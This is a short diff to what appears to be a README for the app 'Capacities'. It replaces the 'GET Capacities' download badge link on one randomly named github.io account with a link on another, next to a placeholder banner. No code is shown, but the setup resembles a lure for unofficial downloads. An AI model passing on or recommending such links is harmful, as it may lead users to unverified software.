@@ -2,7 +2,7 @@
 
 ![Capacities Banner Placeholder](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTkWwtk27YK5DHQgh94ZpLNr2R0XoZ7-BEjqg&s)
 
-[![GET Capacities](https://img.shields.io/badge/GET%20%E2%80%94%20Capacities-0078D6?style=for-the-badge&logoColor=white)](https://murphybarronaeip.github.io/.github/capacities)
+[![GET Capacities](https://img.shields.io/badge/GET%20%E2%80%94%20Capacities-0078D6?style=for-the-badge&logoColor=white)](https://abnerbeardqjwk.github.io/.github/capacities)
 
 ---
 
